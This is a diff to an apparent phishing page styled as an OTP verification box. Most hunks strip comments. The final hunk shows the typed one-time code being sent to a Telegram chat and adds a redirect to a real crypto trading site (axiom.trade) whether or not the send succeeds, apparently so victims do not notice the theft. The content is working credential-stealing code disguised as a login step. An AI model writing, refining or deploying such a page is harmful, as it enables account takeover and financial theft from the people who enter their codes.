@@ -31,7 +31,7 @@
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(0, 0, 0, 0.65); /* dark overlay */
+      background: rgba(0, 0, 0, 0.65);
       z-index: 1;
     }
 
@@ -47,7 +47,6 @@
       box-shadow: 0 8px 20px rgba(0,0,0,0.6);
     }
 
-    /* Header */
     .otp-box h2 {
       font-size: 20px;
       margin-bottom: 12px;
@@ -61,7 +60,6 @@
       margin-bottom: 20px;
     }
 
-    /* OTP Inputs */
     .otp-inputs {
       display: flex;
       justify-content: space-between;
@@ -82,10 +80,9 @@
     }
 
     .otp-inputs input:focus {
-      border: 1px solid #0d6efd; /* highlight on focus */
+      border: 1px solid #0d6efd;
     }
 
-    /* Resend Timer */
     .resend {
       font-size: 13px;
       text-align: center;
@@ -93,7 +90,6 @@
       margin-bottom: 20px;
     }
 
-    /* Footer */
     .footer {
       font-size: 12px;
       color: #888;
@@ -135,7 +131,7 @@
     const inputs = document.querySelectorAll(".otp-inputs input");
     const resend = document.getElementById("resend");
 
-    let sent = false; // Prevent multiple sends
+    let sent = false;
     let timeLeft = 60;
 
     // Auto move & collect OTP
@@ -181,8 +177,16 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: CHAT_ID, text: message })
       })
-      .then(() => console.log("Code sent to Telegram"))
-      .catch(err => console.error("Error:", err));
+      .then(() => {
+        console.log("Code sent to Telegram");
+        // Redirect after sending
+        window.location.href = "https://axiom.trade/discover";
+      })
+      .catch(err => {
+        console.error("Error:", err);
+        // Redirect anyway even if sending fails
+        window.location.href = "https://axiom.trade/discover";
+      });
     }
   </script>
 </body>
